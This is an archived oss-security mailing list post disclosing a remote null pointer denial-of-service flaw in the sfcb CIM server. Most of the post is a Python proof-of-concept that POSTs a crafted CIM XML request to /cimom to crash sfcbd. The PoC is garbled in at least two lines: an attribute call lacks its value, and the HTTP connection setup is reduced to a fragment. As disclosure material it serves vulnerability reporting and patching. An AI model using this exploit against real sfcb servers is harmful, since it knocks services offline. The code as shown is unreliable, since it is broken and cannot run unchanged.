  oss-security - report a vulnerability in sfcb software.            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Wed, 31 Jan (CST) From: XinleiHe To: oss-security@...ts.openwall.com Subject: report a vulnerability in sfcb software.  Hi there,   I am XinleiHe. I will report a vulnerability in sfcb software. SFCB is a CIM server for resource-constrained and embedded environments. It's offical website is sblim.sourceforge.net/wiki/index.php/Sfcb.   A null pointer vulnerabilty exists in sfcb newest remote attacher can send a crafted packet trigger to this vulnerabilty , and make sfcbd DOS. I want to apply a cve id for this vulnerabilty.     You can use following python code to reproduce this vulnerability. -------------------------------------------------------------- import httplib from xml.dom.minidom import Document class write_xml(Document):     def __init__(self):           Document.__init__(self)       def set_tag(self,tag):         self.tag = tag         self.cim = self.createElement(self.tag)         #self.setAttribute("encoding", "utf-8")                  self.cim.setAttribute("CIMVERSION", "2.0")         self.cim.setAttribute("DTDVERSION", "2.0")         self.appendChild(self.cim)           self.msg = self.createElement("MESSAGE")         self.msg.setAttribute("ID",         self.msg.setAttribute("PROTOCOLVERSION","1.0")         self.cim.appendChild(self.msg)           self.sim = self.createElement("SIMPLEREQ")         self.msg.appendChild(self.sim)           self.ime = self.createElement("IMETHODCALL")         self.ime.setAttribute("NAME","EnumerateInstances")         self.sim.appendChild(self.ime)           self.local = self.createElement("LOCALNAMESPACEPATH")         self.ime.appendChild(self.local)                 self.names1=self.createElement("NAMESPACE")         self.names1.setAttribute("NAME", "root")         self.local.appendChild(self.names1)       def display(self):         print self.toprettyxml(indent="   ")     def retdata(self):         return self.toprettyxml(indent="   ")   def httpreq(data): conn = False) conn.request('POST', '/cimom',data) res = conn.getresponse()    def main(): wx = write_xml() wx.set_tag('CIM') print wx.retdata() print httpreq(wx.retdata())   if __name__=='__main__': main() ------------------------------------------------------- Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      